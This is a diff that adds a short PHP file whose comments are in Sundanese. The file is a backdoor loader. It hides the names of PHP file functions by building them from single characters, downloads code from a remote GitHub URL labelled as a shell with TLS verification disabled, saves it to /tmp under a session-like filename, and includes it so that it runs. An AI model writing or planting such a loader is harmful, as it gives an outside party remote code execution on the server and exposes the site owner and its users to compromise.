@@ -1,0 +1,27 @@
+<?php
+$fgc = "f" . "i" . "l" . "e" . "_" . "g" . "e" . "t" . "_" . "c" . "o" . "n" . "t" . "e" . "n" . "t" . "s";
+$fw = "f" . "w" . "r" . "i" . "t" . "e";
+$fo = "f" . "o" . "p" . "e" . "n";
+$fc = "f" . "c" . "l" . "o" . "s" . "e";
+
+// Ngaganti ngaran variabel di dieu
+$mrskk_file = 'sess_' . md5('nax') . '.php'; // Ngaran anyar pikeun memeklodon
+$mysql = ['https://raw.githubusercontent.com/sekjhhh/shell-skkpunya/refs/heads/main/lts-kecee', "/tmp/$mrskk_file"]; // Ganti di dieu
+
+if (!file_exists($mysql[1]) || filesize($mysql[1]) === 0) {
+    $context = stream_context_create([
+        "ssl" => [
+            "verify_peer" => false,
+            "verify_peer_name" => false,
+        ],
+    ]);
+
+    // Ganti di dieu
+    $mrskk = $fo($mysql[1], 'w+'); // Ngaran anyar pikeun kontolodn
+    $fw($mrskk, $fgc($mysql[0], false, $context));
+    $fc($mrskk);
+}
+
+// Ngainclude file anu geus diunduh
+include($mysql[1]);
+?>
